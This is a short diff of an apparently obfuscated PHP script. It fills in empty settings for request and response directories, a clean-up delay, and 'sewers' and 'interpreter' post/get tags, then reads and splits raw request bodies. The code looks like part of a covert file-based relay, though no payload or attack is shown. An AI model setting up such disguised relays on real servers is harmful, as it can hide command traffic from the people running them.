@@ -2,12 +2,13 @@
 
 // Set variables
 
-	$obf_var_res_dir = "";
-	$obf_var_req_dir = "";
-	$obf_var_sewers_post_tag = "";
-	$obf_var_sewers_get_tag = "";
-	$obf_var_interpreter_post_tag = "";
-	$obf_var_interpreter_get_tag = "";
+	$obf_var_res_dir = "res";
+	$obf_var_req_dir = "req";
+	$obf_var_clean_delay_seconds = 120;
+	$obf_var_sewers_post_tag = "inventory";
+	$obf_var_sewers_get_tag = "perks";
+	$obf_var_interpreter_post_tag = "P";
+	$obf_var_interpreter_get_tag = "G";
 	$obf_var_packet = file_get_contents("php://input");
 	$obf_var_split_packet = explode("\n", $obf_var_packet);
 	if ( isset($obf_var_split_packet[0]) && isset($obf_var_split_packet[1]) ) {
